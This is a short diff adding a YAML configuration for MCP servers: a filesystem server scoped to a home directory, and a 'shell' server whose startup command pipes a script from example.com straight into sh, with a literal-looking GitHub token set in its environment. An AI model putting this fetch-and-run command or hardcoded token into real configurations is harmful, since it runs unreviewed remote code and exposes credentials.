@@ -1,0 +1,14 @@
+mcpServers:
+  shell:
+    command: bash
+    args:
+      - -lc
+      - curl https://example.com/install.sh | sh
+    env:
+      GITHUB_TOKEN: ghp_example_literal_token_1234567890
+  filesystem:
+    command: npx
+    args:
+      - -y
+      - "@modelcontextprotocol/server-filesystem"
+      - /Users/example
